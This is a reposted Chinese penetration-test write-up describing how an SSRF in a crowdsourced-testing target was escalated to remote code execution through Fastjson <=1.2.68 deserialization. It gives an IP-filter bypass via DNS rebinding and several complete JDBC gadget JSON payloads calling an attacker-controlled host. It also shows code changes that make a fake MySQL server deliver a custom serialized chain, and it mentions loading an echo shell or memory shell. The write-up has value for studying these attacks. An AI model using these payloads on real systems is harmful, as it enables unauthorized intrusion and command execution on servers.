> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650611124&idx=3&sn=697642233fb6fa80291f9cbac0fbf12b

#  记某众测Fastjson<=1.2.68反序列化RCE过程  
 黑白之道   2025-06-20 01:59  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/3xxicXNlTXLicwgPqvK8QgwnCr09iaSllrsXJLMkThiaHibEntZKkJiaicEd4ibWQxyn3gtAWbyGqtHVb0qqsHFC9jW3oQ/640?wx_fmt=gif "")  
# 原文首发在：先知社区  
  
https://xz.aliyun.com/news/17489  
# 前言  
  
  
在某次众测过程中使用搜索引擎找到某单位部署的旁站，通过前端JS信息分析找到一处ssrf漏洞。在ssrf测试时根据提示信息得到服务端接收的数据格式为json格式，再通过构造json报错语句时服务端报错回显了fastjson版本号为1.2.58，然后寻找Fastjson 1.2.58利用链，最后RCE。很幸运利用的过程中都如预期所料没出现坑点。  
  
# 寻找漏洞  
  
  
在渗透过程中，如果遇到一些部署了很久的老站点（比如zf、edu），利用搜索引擎和网站时光机(web.archive.org)可以发现大量历史资产。下面以百度为例，使用过程中感觉必应搜集到的信息比谷歌要多  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/GzdTGmQpRic0UZ7s6fyUx7RZ5YvxX2icOBfxfohDBbf7lLWJllfjibQaksJMGegEF44TCCDYw409xiaYibRicm3ibZnfQ/640?wx_fmt=png&from=appmsg&wxfrom=13&tp=wxpic&watermark=1 "")  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/GzdTGmQpRic0UZ7s6fyUx7RZ5YvxX2icOBLe8AibOJsaoibzWMy2L8ChDLGjM3vhZNgrrRNvefXRw876lOuGtiaeSdg/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
这个过程中我使用必应找到了xx系统，然后对js进行分析，找到了xxx/checkTokenByUrl接口，由于是键值对的形式，直接搜索键值xxx_CANENTER就能找到对应的参数。（漏洞修复在前端将这些接口都删了没图~~哈哈）  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/GzdTGmQpRic0UZ7s6fyUx7RZ5YvxX2icOBaNEGRfGPJ0Tz4HWAFibPaW5mkfaX56Wc7PsObly1ibCsB17tlcN6RurQ/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
## SSRF漏洞  
  
  
然后就找到了这三个参数，构造请求，根据参数名可以发现callBackUrl应该是接受一个url地址，将url指向个人VPS地址，接收到了请求。  
  
  
orgId=&accessToken=&callBackUrl=  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/GzdTGmQpRic0UZ7s6fyUx7RZ5YvxX2icOBsson9TQ2HytRHiamgta8j4rPVQUQcWtsrqsMc4zrK8Ipe1CdLknhqUA/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/GzdTGmQpRic0UZ7s6fyUx7RZ5YvxX2icOBKofvRenuNkCuiaiazZX3ZjDBuQcDnomOU1IOynX9ibtpLBPpZyYq7w3fQ/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
到此基本可以判断此处存在SSRF了，再将url地址指向一个内网IP，根据响应时间判断通内网  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/GzdTGmQpRic0UZ7s6fyUx7RZ5YvxX2icOBc56A3hIN3Tyv9fA4UB6XFX5pTJTyibsXnYicVMSWr9QmdAXQAQzDDnVg/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
根据响应包报错提示可以发现，服务端远程获取数据时，返回的数据不是map类型，也就是json。然后在VPS中，控制返回数据为json，服务端响应token失效  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/GzdTGmQpRic0UZ7s6fyUx7RZ5YvxX2icOBLXtqJjpibvowanLUqQ8Axg2KLeKF8AwicqEefyNOF6wzxY1VWKcNdRyw/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
既然这里解析json那么就测试一下是使用jackson还是fastjson  
  
  

```
{&#34;@type&#34;: &#34;java.lang.AutoCloseable&#34;
```

  
  
  

```
{&#34;a\x63aa&#34;:&#34;00&#34;}
```

  
报错为jackson，反之fastjson  
  
  
这里使用
```
{&#34;@type&#34;: &#34;java.lang.AutoCloseable&#34;
```

  
服务端直接报错返回fastjson版本（补图）  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/GzdTGmQpRic0UZ7s6fyUx7RZ5YvxX2icOBZHAK0csfGKicPQ5zx7FwXsibGibQdgdRc3PGG9kkI0OEsEGGuxwBz9LRA/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
fastjson<=1.2.68一般使用JDBC相关利用链，但是这里我没有进行利用，直接提交报告。我赌他肯定不会完完全全修复的，果然等了几天后漏洞确认并进行了修复，但是没有完全修复。hahahaha~~  
  
## 梅开二度  
  
  
上面提到，漏洞被修复了，然后我就查看它是如何进行修复的，经过一番测试发现，传入的url地址不能为ip地址，从传入域名没有进行限制。  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/GzdTGmQpRic0UZ7s6fyUx7RZ5YvxX2icOBYiba0MSZ37P72bGic4g5kPJicrpRA4QmG7iclYqPIP4bekuTMMsl07fFEw/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/GzdTGmQpRic0UZ7s6fyUx7RZ5YvxX2icOBviaWWd7OYtV3eQGoLBnJvqAblDT3LSWqBn6UNLTAGNx1gD0evG67loQ/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
这要怎么利用呢？可以使用**DNS重绑定**  
绕过限制，众所周知DNS协议的作用是域名到IP的过程，如果将域名指定为一个内网IP就能就能绕过限制。  
http://dnslog.pw/  
就有这个功能  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/GzdTGmQpRic0UZ7s6fyUx7RZ5YvxX2icOB0QkS0AHwB6iblp0icet5LbkAGPTgnXCqAKjcsxCnthyV9KjCco4NFRicw/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
这里可以自己申请一个域名或者使用DNS重绑定的IP指向自己的VPS（国内VPS要备案）  
  
  
那么接下来就进行fantjson反序列化测试了。  
  
# Fastjson <= 1.2.68反序列化RCE探索  
  
  
对于fastjson <= 1.2.68版本，目前常用的利用链是JDBC文件读取、JDBC反序列化、文件写入还有文件读取等，不过较通用的是JDBC文件读取、JDBC反序列化  
  
## fastjson依赖库判断  
  
  
在进行JDBC利用链探测时，首先要判断  
mysql-connector-java  
版本是多少，我这里直接使用对于的poc  
  
  
来自这篇文章：  
[https://mp.weixin.qq.com/s/I0OdFPnRH_r1yZ04tOB-cw](https://mp.weixin.qq.com/s?__biz=MzUzNDMyNjI3Mg==&mid=2247485232&idx=1&sn=7ad52820b928490ef1f99d99f034634e&scene=21#wechat_redirect)  
  
  
  
fastjson<=1.2.68，mysql-connector-java-5.1.1-5.1.49可SSRF 5.1.11至5.1.48可反序列化   
  

```
{
  &#34;@type&#34;: &#34;java.lang.AutoCloseable&#34;,
  &#34;@type&#34;: &#34;com.mysql.jdbc.JDBC4Connection&#34;,
  &#34;hostToConnectTo&#34;: &#34;YOUR_DNSLOG&#34;,
  &#34;portToConnectTo&#34;: 3306,
  &#34;info&#34;: {
    &#34;user&#34;: &#34;yso_xxx&#34;,
    &#34;password&#34;: &#34;pass&#34;,
    &#34;statementInterceptors&#34;: &#34;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&#34;,
    &#34;autoDeserialize&#34;: &#34;true&#34;,
    &#34;NUM_HOSTS&#34;: &#34;1&#34;
  },
  &#34;databaseToConnectTo&#34;: &#34;dbname&#34;,
  &#34;url&#34;: &#34;&#34;
}
```

  
fastjson<=1.2.68，mysql-connector-java-6.0.2-6.0.3可反序列化  
  

```
{
  &#34;@type&#34;: &#34;java.lang.AutoCloseable&#34;,
  &#34;@type&#34;: &#34;com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection&#34;,
  &#34;proxy&#34;: {
    &#34;connectionString&#34;: {
      &#34;url&#34;: &#34;jdbc:mysql://YOUR_DNSLOG:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_xxx_calc&#34;
    }
  }
}
```

  
fastjson<=1.2.68，mysql-connector-java-8.0.19可反序列化，>8.0.19可SSRF  
  

```
{
    &#34;@type&#34;: &#34;java.lang.AutoCloseable&#34;,
    &#34;@type&#34;: &#34;com.mysql.cj.jdbc.ha.ReplicationMySQLConnection&#34;,
    &#34;proxy&#34;: {
        &#34;@type&#34;: &#34;com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy&#34;,
        &#34;connectionUrl&#34;: {
            &#34;@type&#34;: &#34;com.mysql.cj.conf.url.ReplicationConnectionUrl&#34;,
            &#34;masters&#34;: [{
                &#34;host&#34;: &#34;&#34;
            }],
            &#34;slaves&#34;: [],
            &#34;properties&#34;: {
                &#34;host&#34;: &#34;YOUR DNSLOG&#34;,
                &#34;user&#34;: &#34;yso_xxx_calc&#34;,
                &#34;dbname&#34;: &#34;dbname&#34;,
                &#34;password&#34;: &#34;pass&#34;,
                &#34;queryInterceptors&#34;: &#34;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&#34;,
                &#34;autoDeserialize&#34;: &#34;true&#34;
            }
        }
    }
}
```


```
{
&#34;@type&#34;: &#34;java.lang.AutoCloseable&#34;,
&#34;@type&#34;: &#34;com.mysql.cj.jdbc.ha.ReplicationMySQLConnection&#34;,
  &#34;proxy&#34;: {
    &#34;@type&#34;: &#34;com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy&#34;,
    &#34;connectionUrl&#34;: {
      &#34;@type&#34;: &#34;com.mysql.cj.conf.url.ReplicationConnectionUrl&#34;,
      &#34;masters&#34;: [
        {
          &#34;host&#34;: &#34;&#34;
        }
      ],
      &#34;properties&#34;: {
        &#34;allowUrlInlocalInfile&#34;: &#34;true&#34;,
        &#34;allowLoadLocalInfile&#34;: &#34;true&#34;,
        &#34;autoDeserialize&#34;: &#34;true&#34;,
        &#34;dbname&#34;: &#34;dbname&#34;,
        &#34;host&#34;: &#34;YOUR_DNSLOG&#34;,
        &#34;password&#34;: &#34;pass&#34;,
        &#34;port&#34;: &#34;7777&#34;,
        &#34;queryInterceptors&#34;: &#34;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&#34;,
        &#34;user&#34;: &#34;win_ini&#34;
      },
      &#34;slaves&#34;: []
    }
  }
}
```

## 反序列化利用  
  
  
在上面探测中，这个payload成功触发dnslog  
  

```
{
  &#34;@type&#34;: &#34;java.lang.AutoCloseable&#34;,
  &#34;@type&#34;: &#34;com.mysql.jdbc.JDBC4Connection&#34;,
  &#34;hostToConnectTo&#34;: &#34;YOUR_DNSLOG&#34;,
  &#34;portToConnectTo&#34;: 3306,
  &#34;info&#34;: {
    &#34;user&#34;: &#34;yso_xxx&#34;,
    &#34;password&#34;: &#34;pass&#34;,
    &#34;statementInterceptors&#34;: &#34;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&#34;,
    &#34;autoDeserialize&#34;: &#34;true&#34;,
    &#34;NUM_HOSTS&#34;: &#34;1&#34;
  },
  &#34;databaseToConnectTo&#34;: &#34;dbname&#34;,
  &#34;url&#34;: &#34;&#34;
}
```

  
既然触发了DNSLOG，那么接下来就可以搭建一个利用Mysql服务了，用到了下面这个项目，根据使用说明书进行使用  
  
  
python<3.8用这个
```
https://github.com/fnmsd/MySQL_Fake_Server
```

  
  
  
python3.8+用这个
```
https://github.com/clown1ay/MySQL_Fake_Server
```

  
  
  
首先进行文件读取，user指定要读取的文件  
  

```
{
  &#34;@type&#34;: &#34;java.lang.AutoCloseable&#34;,
  &#34;@type&#34;: &#34;com.mysql.jdbc.JDBC4Connection&#34;,
  &#34;hostToConnectTo&#34;: &#34;YOUR_DNSLOG&#34;,
  &#34;portToConnectTo&#34;: 7777,
  &#34;info&#34;: {
    &#34;user&#34;: &#34;win_ini&#34;,
    &#34;password&#34;: &#34;pass&#34;,
    &#34;statementInterceptors&#34;: &#34;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&#34;,
    &#34;autoDeserialize&#34;: &#34;true&#34;,
    &#34;NUM_HOSTS&#34;: &#34;1&#34;
  },
  &#34;databaseToConnectTo&#34;: &#34;dbname&#34;,
  &#34;url&#34;: &#34;&#34;
}
```

  
本地和目标系统都读取不成功，本地  
mysql-connector-java为5.1.47  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/GzdTGmQpRic0UZ7s6fyUx7RZ5YvxX2icOByuZOuwMaT5MFawD7LkHQZ9ehERU7wL4y6QPIguZwClTeR7UNhRCHcA/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
转战反序列化，先进行DNSURL利用链探测，反序列化操作是否成功  
  

```
{
  &#34;@type&#34;: &#34;java.lang.AutoCloseable&#34;,
  &#34;@type&#34;: &#34;com.mysql.jdbc.JDBC4Connection&#34;,
  &#34;hostToConnectTo&#34;: &#34;YOUR_DNSLOG&#34;,
  &#34;portToConnectTo&#34;: 7777,
  &#34;info&#34;: {
    &#34;user&#34;: &#34;yso_URLDNS_http://YOUR_DNSLOG&#34;,
    &#34;password&#34;: &#34;pass&#34;,
    &#34;statementInterceptors&#34;: &#34;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&#34;,
    &#34;autoDeserialize&#34;: &#34;true&#34;,
    &#34;NUM_HOSTS&#34;: &#34;1&#34;
  },
  &#34;databaseToConnectTo&#34;: &#34;dbname&#34;,
  &#34;url&#34;: &#34;&#34;
}
```

  
本地演示  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/GzdTGmQpRic0UZ7s6fyUx7RZ5YvxX2icOBylOLcL2MRhtQvibiaR7JYZibhcCiaFSptsIDNTtUicnoDM9b0Wlafu9bGBw/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/GzdTGmQpRic0UZ7s6fyUx7RZ5YvxX2icOBpDvxpkkQ89VicRIBTLaaJVA6TaEE0YASHmyGYedY2eic2ic6KUe1hMeVQ/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
既然能正常执行反序列化操作，那么下一步就需要测试命令执行。这里使用到了@Y4tacker大佬给出的利用链  
  
  
https://paper.seebug.org/2067/  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/GzdTGmQpRic0UZ7s6fyUx7RZ5YvxX2icOBO92Ny1oFvnhvVMXmDy2Rka4ibZdAHhShO44cLPMoGWGq80ISDSXc40A/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
## 代码微调  
  
  
直接拿文章中给出的代码进行修改，添加这段代码，将反序列化的内容保存到文件中。自定义执行命令  
  

```
ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&#34;fastjson1268.bin&#34;));
oos.writeObject(hashMap);
oos.close();
```

  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/GzdTGmQpRic0UZ7s6fyUx7RZ5YvxX2icOBWIhLU7EsWMNUyTEW5vibo3Ba1NG0GhTxt19JXFQdqMApGJEV2xksVOQ/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
还要修改
```
MySQL_Fake_Server
```

  
项目server.py文件，get_yso_content函数的内容，让其从指定文件中读取  
  

```
with open(r'fastjson1268.bin','rb') as f:
    file_content = f.read()
return file_content
```

  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/GzdTGmQpRic0UZ7s6fyUx7RZ5YvxX2icOBZiaciaPtaf8uMgj2b6onicXRJqrFXLRycx2iaauYKhic6za5Kj7Qibrqnc5g/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
将生成的fastjson1268.bin放到server.py文件同级目录中，运行server.py文件  
  
  
user填入yso_xxx就能触发server.py的get_yso_content函数，此时fastjson测试payload为  
  

```
{
  &#34;@type&#34;: &#34;java.lang.AutoCloseable&#34;,
  &#34;@type&#34;: &#34;com.mysql.jdbc.JDBC4Connection&#34;,
  &#34;hostToConnectTo&#34;: &#34;YOUR_DNSLOG&#34;,
  &#34;portToConnectTo&#34;: 7777,
  &#34;info&#34;: {
    &#34;user&#34;: &#34;yso_URLDNS_http://YOUR_DNSLOG&#34;,
    &#34;password&#34;: &#34;pass&#34;,
    &#34;statementInterceptors&#34;: &#34;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&#34;,
    &#34;autoDeserialize&#34;: &#34;true&#34;,
    &#34;NUM_HOSTS&#34;: &#34;1&#34;
  },
  &#34;databaseToConnectTo&#34;: &#34;dbname&#34;,
  &#34;url&#34;: &#34;&#34;
}
```

  
很幸运系统成功触发了命令执行ping xx.dnslog.com  
  
  
到此就完成了RCE，证明漏洞危害，提交报告。  
  
## 反序列化改造  
  
  
查看Y4大佬给出的利用链可以发现，其使用的是  
TemplatesImpl  
进行动态加载字节码，那么直接将字节码改为回显马和内存马也是可以的，我将回显马编译为class文件，然后读取该文件，传入到  
_bytecodes中  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/GzdTGmQpRic0UZ7s6fyUx7RZ5YvxX2icOBjuqicFaC4pCcupwZKbbicPuhQYibhrzo3uZlcK7V5kicpof5ahb2ymVPXQ/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/GzdTGmQpRic0UZ7s6fyUx7RZ5YvxX2icOBRFYY9hR9zNrKCUN7phRDvRKytSCnpCRaSUsM2mY0lpp6BKFfmXY43Q/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
> **文章来源：Hack之道**  
  
  
  
黑白之道发布、转载的文章中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途及盈利等目的，否则后果自行承担！  
  
如侵权请私聊我们删文  
  
  
**END**  
  
  
